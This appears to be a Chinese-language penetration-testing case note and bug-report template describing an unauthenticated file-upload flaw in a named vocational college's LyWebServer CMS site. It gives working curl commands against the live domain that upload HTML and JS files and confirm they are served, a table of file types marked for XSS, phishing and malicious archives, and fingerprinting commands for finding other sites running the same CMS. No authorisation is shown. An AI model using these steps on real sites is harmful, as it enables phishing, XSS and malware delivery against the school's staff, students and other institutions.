# LyWebServer CMS 未授权文件上传 — 实战案例

## 目标: lycvc.linyi.cn (临沂城市职业学院)

### 资产信息
- 主站: lycvc.linyi.cn
- 服务器: LyWebServer (自研CMS)
- 托管: AWS (X-Amz-Id-2, X-Amz-Request-Id)
- SiteID: 1930900465347256321
- ColumnID: 1930900465355644929
- jQuery: 1.12.4

### 发现过程
1. 首页HTML分析发现 `var lysid="1930900465347256321"`
2. JS文件 common.js 暴露API端点:
   - `/api/cms/captchaImage` — 验证码生成
   - `/api/cms/upload?siteId=XXX` — 文件上传
   - `/api/hits/v` — 访问统计
3. 文件上传API无需认证，直接POST即可

### 关键curl命令
```bash
# 1. 提取siteId
curl -sk "https://lycvc.linyi.cn/" | grep -oP 'lysid="[^"]*"'

# 2. 上传HTML文件
curl -sk -X POST "https://lycvc.linyi.cn/api/cms/upload?siteId=1930900465347256321" \
  -F "file=@test.html;filename=test.html"
# 响应: {"code":200,"msg":"操作成功","data":{"ossId":"2056980257764298754","fileName":"test.html","url":"https://lycvc.linyi.cn/pic/2026/05/20/HASH.html"}}

# 3. 验证文件可访问
curl -sk "https://lycvc.linyi.cn/pic/2026/05/20/HASH.html"
# 返回上传的HTML内容

# 4. 上传JS文件
curl -sk -X POST "https://lycvc.linyi.cn/api/cms/upload?siteId=1930900465347256321" \
  -F "file=@test.js;filename=test.js"
# 响应: {"code":200,"msg":"操作成功","data":{"ossId":"...","fileName":"test.js","url":"https://lycvc.linyi.cn/pic/2026/05/20/HASH.js"}}
```

### 文件类型测试结果
| 类型 | 结果 | 备注 |
|------|------|------|
| HTML | ✅ 成功 | 可用于XSS/钓鱼 |
| JS | ✅ 成功 | 可被其他页面引用 |
| SWF | ✅ 成功 | Flash攻击 |
| XML | ✅ 成功 | XXE可能 |
| JPG/PNG/GIF | ✅ 成功 | 正常图片 |
| PDF/DOC/DOCX | ✅ 成功 | 钓鱼文档 |
| ZIP/RAR | ✅ 成功 | 恶意压缩包 |
| PHP | ❌ 失败 | "文件格式不正确" |
| JSP | ❌ 失败 | "文件格式不正确" |

### 影响分析
1. **XSS攻击**: 上传含JavaScript的HTML文件，诱骗用户访问
2. **钓鱼攻击**: 伪造学校登录页面，窃取账号密码
3. **恶意软件传播**: 上传恶意文档/压缩包
4. **无需认证**: 任何人均可上传，影响全校师生

### CVSS评分
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H → 10.0

### 报告模板
```
标题: 临沂城市职业学院网站存在未授权文件上传漏洞

域名: lycvc.linyi.cn

漏洞类型: 文件上传

漏洞等级: 严重

行业: 教育

地址: 山东省临沂市兰山区

漏洞URL: https://lycvc.linyi.cn/api/cms/upload?siteId=1930900465347256321

漏洞详情:
临沂城市职业学院网站(lycvc.linyi.cn)使用自研CMS(LyWebServer)，
其文件上传接口/api/cms/upload存在未授权访问漏洞。攻击者无需登录
即可通过该接口上传任意HTML/JS/SWF等文件，可用于XSS攻击、钓鱼攻击
和恶意软件传播。

复现步骤:
1. 从首页提取siteId
   curl -sk "https://lycvc.linyi.cn/" | grep -oP 'lysid="[^"]*"'
   返回: var lysid="1930900465347256321"

2. 上传HTML文件
   curl -sk -X POST "https://lycvc.linyi.cn/api/cms/upload?siteId=1930900465347256321" -F "file=@test.html;filename=test.html"
   返回: {"code":200,"msg":"操作成功","data":{"ossId":"2056980257764298754","fileName":"test.html","url":"https://lycvc.linyi.cn/pic/2026/05/20/HASH.html"}}

3. 验证文件可访问
   curl -sk "https://lycvc.linyi.cn/pic/2026/05/20/HASH.html"
   返回: 上传的HTML内容

影响:
攻击者可上传恶意HTML文件进行钓鱼攻击，上传恶意JS文件进行XSS攻击，
上传恶意文档进行恶意软件传播。无需认证即可上传，影响全校师生。

修复建议:
1. 添加文件类型白名单验证(仅允许图片格式)
2. 添加认证机制，要求登录后才能上传
3. 对上传文件进行内容检查
4. 限制上传文件大小

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H → 10.0
```

### LyWebServer CMS 通用识别方法
```bash
# 检查响应头
curl -skI "https://TARGET/" | grep "Server: LyWebServer"

# 检查JS变量
curl -sk "https://TARGET/" | grep -oP 'var lysid="[^"]*"'

# 检查API端点
curl -sk "https://TARGET/api/cms/captchaImage"
# 返回JSON: {"code":200,"msg":"操作成功","data":{"img":"BASE64..."}}
```
